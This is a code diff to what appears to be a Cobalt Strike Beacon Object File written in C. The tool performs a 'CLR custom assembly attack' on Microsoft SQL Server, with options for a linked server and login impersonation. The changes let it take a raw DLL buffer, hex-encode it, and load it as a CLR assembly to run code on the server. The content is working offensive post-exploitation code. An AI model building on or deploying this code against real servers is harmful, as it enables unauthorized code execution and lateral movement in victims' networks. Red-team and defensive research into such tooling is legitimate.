@@ -30,6 +30,14 @@ void ExecuteClrAssembly(char* server, char* database, char* link, char* imperson
 		goto END;
 	}
 
+	if (link == NULL)
+	{
+		internal_printf("[*] Performing CLR custom assembly attack on %s\n\n", server);
+	}
+	else
+	{
+		internal_printf("[*] Performing CLR custom assembly attack on %s via %s\n\n", link, server);
+	}
 	//
 	// allocate statement handle
 	//
@@ -215,20 +223,21 @@ VOID go(
 	char* function;
 	char* hash;
 	char* hexBytes;
+	LPBYTE lpDllBuffer = NULL;
+	DWORD dwDllBufferSize = 0;
 
 	//
 	// parse beacon args 
 	//
 	datap parser;
 	BeaconDataParse(&parser, Buffer, Length);
-	
 	server	 	= BeaconDataExtract(&parser, NULL);
 	database 	= BeaconDataExtract(&parser, NULL);
 	link 		= BeaconDataExtract(&parser, NULL);
 	impersonate = BeaconDataExtract(&parser, NULL);
 	function 	= BeaconDataExtract(&parser, NULL);
 	hash		= BeaconDataExtract(&parser, NULL);
-	hexBytes 	= BeaconDataExtract(&parser, NULL);
+	lpDllBuffer = BeaconDataExtract(&parser, (int*)&dwDllBufferSize);
 
 	server = *server == 0 ? "localhost" : server;
 	database = *database == 0 ? "master" : database;
@@ -244,9 +253,26 @@ VOID go(
 	{
 		return;
 	}
-	
-	ExecuteClrAssembly(server, database, link, impersonate, function, hash, hexBytes);
 
+	//
+	// Convert the raw dll to hex string
+	//
+	hexBytes = (char*) intAlloc(dwDllBufferSize * 2 + 1);
+	if (hexBytes == NULL)
+	{
+		internal_printf("[!] Failed to allocate memory for hex conversion\n");
+		printoutput(FALSE);
+		return;
+	}
+
+	for (DWORD i = 0; i < dwDllBufferSize; i++)
+	{
+		MSVCRT$sprintf(hexBytes + (i * 2), "%02X", lpDllBuffer[i]);
+	}
+	hexBytes[dwDllBufferSize * 2] = '\0';
+
+	ExecuteClrAssembly(server, database, link, impersonate, function, hash, hexBytes);
+	intFree(hexBytes);
 	printoutput(TRUE);
 };
 
